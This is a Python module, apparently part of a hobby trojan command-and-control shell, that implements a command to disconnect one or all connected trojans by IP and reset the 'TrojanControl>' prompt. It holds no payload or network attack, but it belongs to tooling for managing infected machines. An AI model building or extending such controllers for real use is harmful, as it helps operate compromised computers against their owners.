__author__ = 'Jonas'
from trojanshell import TrojanShell
from util import shellprint
from util import Message
from util import isip
from JTShell.util.error import ProcessError


def run(process, std="all", info=True):
    shell = process.shell
    disconnected_trojans = 0
    # only made for the convinience in the ide
    if isinstance(shell, TrojanShell):

        # disconnects all trojans of the currently used trojans within the trojan register in case they actually
        # are connected at the moment
        if std == "all":
            for name in shell.client.cache:
                shell.client.remove(name)
                disconnected_trojans += 1
        # disconnects the trojan with the given ip, after verifying, that it is connected
        else:
            if std in shell.client.cache:
                shell.client.remove(std)
                disconnected_trojans += 1
            else:
                raise ProcessError("The Trojan with the ip '{0}' is not connected".format(std))
        shell.prompt = "\n TrojanControl> "
        return "{0} trojans finally disconnected".format(disconnected_trojans)



